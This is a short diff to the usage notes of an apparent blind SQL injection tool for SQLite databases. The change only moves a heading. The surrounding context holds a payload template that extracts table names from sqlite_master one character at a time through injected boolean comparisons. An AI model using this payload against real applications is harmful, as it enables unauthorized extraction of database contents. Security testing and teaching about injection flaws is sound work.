@@ -3,9 +3,8 @@ Blind SQL Injection For SQLite Databases
 
 https://github.com/aykutcanustun
 Author: aykutcanustun
-
-How to set queries:
 __________________________________________________________________________________________________________
+How to set queries:
 To retrieve table names from database, use this one:
 ' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {} --
 
